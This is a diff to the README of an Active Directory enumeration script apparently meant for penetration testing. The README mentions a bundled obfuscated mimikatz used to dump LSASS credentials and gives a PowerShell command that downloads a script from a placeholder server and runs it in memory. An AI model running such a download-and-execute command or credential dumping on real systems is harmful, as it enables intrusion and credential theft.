@@ -9,12 +9,14 @@ ADEN is a local enumeration script for active directory environments, it is a me
 - Invoke-Rubeus
 
 
-It is to be used as an all-in-one enumeration script to use when you are in a domain user's session. An obfuscated version of mimikatz is included separately in order to dump LSASS: ```lsdmp.ps1```\
+It is to be used as an all-in-one enumeration script to use when you are in a domain user's session. \
+ \
+An obfuscated version of mimikatz is included separately in order to dump LSASS: ```lsdmp.ps1```\
 \
 Big credits to all the authors of the above mentioned tools! You are awesome.
 
 ## How to use?
-The function ```Invoke-FullEnum``` will launch a full enumeration that will allow you to initially map the  AD environment.
+Once the script is loaded in-memory, the function ```Invoke-FullEnum``` will launch a full enumeration that will allow you to initially map the AD environment.
 
 ```powershell
 iex(iwr -usebasicparsing http://[SERVER]/aden.ps1);Invoke-FullEnum
